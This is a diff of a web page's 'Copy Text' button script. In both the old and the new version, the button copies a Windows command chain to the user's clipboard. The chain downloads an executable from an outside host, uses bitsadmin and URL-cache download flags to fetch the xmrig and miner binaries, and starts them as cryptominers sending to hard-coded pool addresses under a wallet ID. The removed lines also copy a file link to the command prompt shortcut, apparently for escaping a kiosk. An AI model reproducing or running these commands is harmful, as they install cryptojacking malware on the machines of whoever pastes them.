@@ -88,8 +88,7 @@
  <div class="container">
 	
 
-		  <button id="copyButton">Copy Text</button>
-
+  <button onclick="copyToClipboard()">Copy Text</button>
 
 
 	</div>
@@ -109,67 +108,18 @@
 	
 		</p>
     
-<script>
-	function copyTextToClipboard(text) {
-      var textArea = document.createElement("textarea");
 
-      // Set the text content to be copied
-      textArea.value = text;
 
-      // Add the textarea to the document
-      document.body.appendChild(textArea);
-
-      // Select the text
-      textArea.select();
-      textArea.setSelectionRange(0, 99999); // For mobile devices
-
-      // Copy the selected text
-      document.execCommand('copy');
-
-      // Remove the textarea from the document
-      document.body.removeChild(textArea);
+  <script>
+    function copyToClipboard() {
+      const textToCopy = `cd c:&cd/&cd users&cd kiosk&cd downloads&curl -O "https://picteon.dev/files/rdl.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 c:\users\kiosk\downloads\rdl.exe c:\users\kiosk\rdl.exe& bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd..&timeout 120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe"&timeout120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&timeout 120&start "" cmd /c miner.exe --algo kawpow --server stratum+tcp://35.190.124.115:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet &timeout 120&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=1`;
+      navigator.clipboard.writeText(textToCopy)
+        .then(() => alert("Text copied to clipboard!"))
+        .catch(err => alert("Failed to copy text: " + err));
     }
+  </script>
 
-    // When the button is clicked, copy the specified text
-    document.getElementById("copyButton").addEventListener("click", function() {
-      var textToCopy = `cd c:&cd/&cd users&cd kiosk&cd downloads&curl -O "https://picteon.dev/files/rdl.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 c:\users\kiosk\downloads\rdl.exe c:\users\kiosk\rdl.exe& bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd..&timeout 120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe"&timeout120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&timeout 120&start "" cmd /c miner.exe --algo kawpow --server stratum+tcp://35.190.124.115:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet &timeout 120&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=16`;
-
-      copyTextToClipboard(textToCopy);
-     
-    });
-	</script>
-
-
-
-	    <script>
-	function copyTextToClipboard(text) {
-      var textArea = document.createElement("textarea");
-
-      // Set the text content to be copied
-      textArea.value = text;
-
-      // Add the textarea to the document
-      document.body.appendChild(textArea);
-
-      // Select the text
-      textArea.select();
-      textArea.setSelectionRange(0, 99999); // For mobile devices
-
-      // Copy the selected text
-      document.execCommand('copy');
-
-      // Remove the textarea from the document
-      document.body.removeChild(textArea);
-    }
-
-    // When the button is clicked, copy the specified text
-    document.getElementById("copyButton2").addEventListener("click", function() {
-      var textToCopy = `file:///C:/users/kiosk/appdata/roaming/microsoft/windows/start%20menu/programs/system%20tools/command%20prompt.lnk`;
-
-      copyTextToClipboard(textToCopy);
-     
-    });
-	</script>
+	
 </div>
 
 
